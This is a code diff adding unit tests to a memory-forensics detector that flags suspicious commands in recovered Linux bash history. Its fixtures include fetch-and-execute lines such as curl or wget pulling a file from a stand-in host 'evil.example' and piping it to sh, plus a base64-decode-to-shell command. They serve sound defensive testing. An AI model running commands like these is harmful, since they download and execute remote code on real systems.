@@ -12,6 +12,7 @@ import base64
 from sift_find_evil.detectors.memory_detector import MemoryDetector
 from sift_find_evil.findings import FindingCategory
 from sift_find_evil.memory.volatility_runner import (
+    BashHistoryRow,
     CommandLineRow,
     InjectionRow,
     NetworkRow,
@@ -615,3 +616,62 @@ def test_analyze_aggregates_across_streams() -> None:
 
 def test_analyze_with_no_streams_returns_empty() -> None:
     assert MemoryDetector().analyze() == []
+
+
+# -- linux bash history (SFE-6tv) ------------------------------------------
+#
+# The Vol3 linux.bash plugin walks the in-memory history buffer of every
+# running bash process, giving us attacker keystrokes even when $HISTFILE
+# was disabled. We look for a small set of high-signal substrings rather
+# than a generic "is this suspicious" classifier to keep false positives
+# down on developer workstations (where `curl | sh` is occasionally
+# legitimate).
+
+
+def _bash_row(pid: int, command: str, *, process: str = "bash") -> BashHistoryRow:
+    return BashHistoryRow(
+        pid=pid,
+        process=process,
+        command_time="2020-09-20 10:30:00 UTC+0000",
+        command=command,
+        raw_row={},
+    )
+
+
+def test_bash_curl_pipe_sh_fires() -> None:
+    row = _bash_row(4242, "curl -s http://evil.example/i.sh | sh")
+    findings = MemoryDetector().analyze(linux_bash=[row])
+    assert len(findings) == 1
+    assert findings[0].category == FindingCategory.PERSISTENCE
+    assert findings[0].evidence["pid"] == 4242
+    assert "T1059.004" in findings[0].evidence["mitre_attack"]
+
+
+def test_bash_wget_chmod_exec_from_tmp_fires() -> None:
+    row = _bash_row(4242, "wget http://evil.example/p -O /tmp/p && chmod +x /tmp/p")
+    findings = MemoryDetector().analyze(linux_bash=[row])
+    assert len(findings) == 1
+    assert findings[0].category == FindingCategory.PERSISTENCE
+
+
+def test_bash_benign_command_does_not_fire() -> None:
+    row = _bash_row(100, "ls -la /var/log")
+    assert MemoryDetector().analyze(linux_bash=[row]) == []
+
+
+def test_bash_none_command_skipped_without_raising() -> None:
+    row = BashHistoryRow(
+        pid=4242,
+        process="bash",
+        command_time=None,
+        command=None,
+        raw_row={},
+    )
+    assert MemoryDetector().analyze(linux_bash=[row]) == []
+
+
+def test_bash_base64_decode_pipe_sh_fires() -> None:
+    row = _bash_row(4242, "echo ZWNobyBodW50ZWQK | base64 -d | sh")
+    findings = MemoryDetector().analyze(linux_bash=[row])
+    assert len(findings) == 1
+    assert "T1140" in findings[0].evidence["mitre_attack"]
